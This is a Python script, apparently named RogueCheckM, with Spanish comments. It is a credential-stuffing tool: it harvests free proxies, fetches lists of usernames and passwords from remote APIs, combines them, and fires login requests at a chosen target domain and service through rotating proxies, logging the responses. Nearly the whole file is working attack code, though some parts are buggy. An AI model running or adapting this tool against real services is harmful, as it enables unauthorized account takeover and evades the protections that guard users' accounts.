import argparse
import random
import inquirer
import requests
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm
import sqlite3
import httpx
import signal
import sys
import time
import json

# Constantes
MAX_RETRIES = 3  # Máximo de intentos de reintentar obtener contraseñas con un proxy
REQUEST_TIMEOUT = 5  # Tiempo máximo de espera para solicitudes en segundos
REQUEST_TIMEOUT_CHECK_PROXY = 1
DATABASE_PATH = None
NEW_URL = False

def signal_handler(sig, frame):
    time.sleep(2)
    print("Ctrl+C presionado. Cancelando la ejecución...")
    sys.exit(0)

def load_config():
    try:
        response = requests.get('https://j0rd1s3rr4n0.github.io/api/RogueCheckM/config.json')
        config = response.json()
        return config
    except Exception as e:
        print(f"Error al cargar la configuración: {e}")
        sys.exit(1)

def create_tables(conn, config):
    try:
        cursor = conn.cursor()

        # Crear tablas según la configuración
        for table_name, columns in config["database"]["tables"].items():
            columns_definition = ', '.join(columns)
            cursor.execute(f"CREATE TABLE IF NOT EXISTS {table_name} ({columns_definition})")

        conn.commit()
        cursor.close()
    except Exception as e:
        print(f"Error al crear las tablas en la base de datos: {e}")
        sys.exit(1)

def check_proxy(proxy):
    try:
        response = requests.get('https://www.google.com', proxies={'http': proxy, 'https': proxy}, timeout=REQUEST_TIMEOUT_CHECK_PROXY)
        if response.status_code == 200:
            insert_proxy(conn=conn, proxy=proxy)
            return proxy
    except Exception as e:
        pass

def insert_proxy(conn, proxy):
    try:
        cursor = conn.cursor()
        ip, port = proxy.split(':') if ':' in proxy else (proxy, None)
        cursor.execute("INSERT INTO proxys (ip, port) VALUES (?, ?)", (ip, port))
        conn.commit()
        cursor.close()
    except Exception as e:
        pass

def insert_usernames(conn, usernames):
    try:
        cursor = conn.cursor()
        for username in usernames:
            cursor.execute("INSERT INTO Usernames (username) VALUES (?)", (username,))
        conn.commit()
        cursor.close()
    except Exception as e:
        print(f"Error al insertar los usernames en la base de datos: {e}")

def insert_passwords(conn, passwords):
    try:
        cursor = conn.cursor()
        for password in passwords:
            cursor.execute("INSERT INTO Passwords (password) VALUES (?)", (password,))
        conn.commit()
        cursor.close()
    except Exception as e:
        print(f"Error al insertar los passwords en la base de datos: {e}")

def get_usernames(proxy):
    try:
        with sqlite3.connect(DATABASE_PATH) as conn:
            response = requests.get(USER_API_URL, proxies={'http': proxy, 'https': proxy}, timeout=REQUEST_TIMEOUT)
            usernames = random.sample(response.json(), 100)
            insert_usernames(conn, usernames)
            return usernames
    except Exception as e:
        return []

def get_passwords(proxy):
    try:
        retries = 0
        while retries < MAX_RETRIES:
            try:
                with sqlite3.connect(DATABASE_PATH) as conn:
                    response = requests.get(PASS_API_URL, proxies={'http': proxy, 'https': proxy}, timeout=REQUEST_TIMEOUT)
                    passwords = random.sample(response.json(), 100)
                    insert_passwords(conn, passwords)
                    return passwords
            except Exception as e:
                retries += 1
        return []
    except KeyboardInterrupt:
        time.sleep(2)
        print("Ctrl+C presionado. Cancelando la ejecución...")

def generate_combos(conn):
    try:
        cursor = conn.cursor()
        cursor.execute("DELETE FROM Combos")  # Limpiar tabla de combos antes de regenerar
        cursor.execute("SELECT username FROM Usernames")
        usernames = [record[0] for record in cursor.fetchall()]
        cursor.execute("SELECT password FROM Passwords")
        passwords = [record[0] for record in cursor.fetchall()]

        # Generar combos y agregarlos a la base de datos
        for _ in range(100):  # Número arbitrario de combos a generar
            username = random.choice(usernames)
            password = random.choice(passwords)
            cursor.execute("INSERT INTO Combos (username, password) VALUES (?, ?)", (username, password))

        conn.commit()
        cursor.close()

    except Exception as e:
        print(f"Error al generar combos: {e}")

def parse_arguments():
    parser = argparse.ArgumentParser(description="Tu descripción del script")

    parser.add_argument("--url", "-u", dest="new_url", metavar="NEW_URL", type=str, help="Establecer una nueva URL")
    parser.add_argument("--site", "-s", dest="service", metavar="SERVICE", type=str, help="Establecer el servicio objetivo")

    return parser.parse_args()

def get_proxys():
    proxy_urls = config["proxy_sources"]
    proxys = []
    try:
        for url in proxy_urls:
            try:
                response = requests.get(url, timeout=REQUEST_TIMEOUT)
                proxys.extend(response.text.split('\r\n'))
            except Exception as e:
                pass
    except KeyboardInterrupt:
        time.sleep(2)
        print("Ctrl+C presionado. Cancelando la ejecución...")
    return proxys
def working_proxys():
    print('Searching and Checking proxys...')
    with ThreadPoolExecutor() as executor:
        proxys = list(tqdm(executor.map(lambda x: check_proxy(x), get_proxys()), total=len(get_proxys()), desc="Searching and Checking proxys", unit=" proxys"))

    working_proxys = [proxy for proxy in proxys if proxy is not None]
    print(f'Found {len(working_proxys)} working proxys.')

    if not working_proxys:
        print("CANCELED ACCOUNT CHECKING DUE TO LACK OF proxys")
        sys.exit(0)

    return working_proxys

def send_http_requests(conn, combos_len, domain_url, service_name):
    try:
        with ThreadPoolExecutor() as executor:
            combos = [(record[0], record[1]) for record in conn.execute("SELECT username, password FROM Combos").fetchall()]
            results = list(executor.map(lambda x: request_web_combos(combos, working_proxys, DOMAIN_URL, SERVICE_NAME), [combos[i:i + 100] for i in range(0, len(combos), 100)]))

        # Guardar los resultados en el archivo results.txt
        with open('results.txt', 'w') as results_file:
            for result_set in results:
                for result in result_set:
                    print(result)
                    results_file.write(result + '\n')
    except Exception as e:
        print(f"Error al enviar solicitudes HTTP: {e}")

def request_web_combos(combos, proxys, domain_url, service_name):
    """Envía solicitudes HTTP para combos de usernames y passwords."""
    try:
        results = []
        description = f"Sending HTTP Requests to {domain_url}"
        
        # Ensure combos is a list by calling the function if combos is a function
        combos = combos() if callable(combos) else combos
        
        for combo in tqdm(combos, desc=description, unit="combo_proxy"):
            username, password = combo
            url = f'https://{domain_url}?username={username}&password={password}'
            proxy = random.choice(proxys) if proxys else None
            try:
                response = requests.get(url, proxies={'http': proxy, 'https': proxy} if proxy else None, timeout=REQUEST_TIMEOUT)
                response.raise_for_status()
                results.append(response.text)
            except requests.RequestException as e:
                # Manejar errores de solicitud, incluida la cancelación
                pass
        return results
    except Exception as e:
        print(f"Error en la función request_web_combos: {e}")
        return []

def main():
    # if "--url" in sys.argv or "-u" in sys.argv:
    #     NEW_URL = True 
    #     index = sys.argv.index("--url") if "--url" in sys.argv else sys.argv.index("-u")
    #     global DOMAIN_URL
    #     DOMAIN_URL = sys.argv[index + 1]

    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        global config,conn,DATABASE_PATH,USER_API_URL,PASS_API_URL
        config = load_config()
        
        DATABASE_PATH = config["database"]["DATABASE_PATH"]
        USER_API_URL = config["urls"]["user_api"]
        PASS_API_URL = config["urls"]["pass_api"]
        
        with sqlite3.connect(DATABASE_PATH) as conn:
            create_tables(conn, config)

            # print('Searching and Checking proxys...')
            with ThreadPoolExecutor() as executor:
                proxys = list(tqdm(executor.map(lambda x: check_proxy(x), get_proxys()), total=len(get_proxys()), desc="Searching and Checking proxys", unit=" proxys"))
            working_proxys = [proxy for proxy in proxys if proxy is not None]
            print(f'Found {len(working_proxys)} working proxys.')
            
            if not working_proxys:
                print("CANCELED ACCOUNT CHECKING DUE TO LACK OF proxys")
                return

            # print('Searching for Usernames and Passwords...')
            with ThreadPoolExecutor() as executor:
                usernames = list(tqdm(executor.map(lambda x: get_usernames(x), working_proxys), total=len(working_proxys), desc="Searching Usernames and Passwords",unit=" combos_proxy"))

            # print('Checking Valid Formats...')
            with ThreadPoolExecutor() as executor:
                passwords = list(tqdm(executor.map(lambda x: get_passwords(x), working_proxys), total=len(working_proxys), desc="Checking Valid Formats"))

            generate_combos(conn)  # Generar combos antes de enviar solicitudes HTTP

            combos_len = min(len(usernames),len(passwords))  # Número arbitrario de combos a enviar
            print(f'Obtained {combos_len} usernames and passwords.')

            # Selector de Domain URL
            args = parse_arguments()
            global DOMAIN_URL,SERVICE_NAME
            if args.new_url:
                DOMAIN_URL = args.new_url
            elif "domain_default" in config["urls"]:
                DOMAIN_URL = config["urls"]["domain_default"]
            else:
                DOMAIN_URL = input("Enter the Domain URL to target: ")

            print(f'Target Domain: {DOMAIN_URL}')

            # Selector de Servicio
            if args.service:
                SERVICE_NAME = args.service
            else:
                target_domains = config["target_domains"]
                questions = [inquirer.List("service", message="Select the target service", choices=list(target_domains.keys()),),]
                answers = inquirer.prompt(questions)
                SERVICE_NAME = answers["service"]

            print(f'Target Service: {SERVICE_NAME}')

            # Realizar solicitudes HTTP
            send_http_requests(conn, combos_len, DOMAIN_URL, SERVICE_NAME)

    except Exception as e:
        print(f"Error inesperado: {e}")

if __name__ == "__main__":
    main()
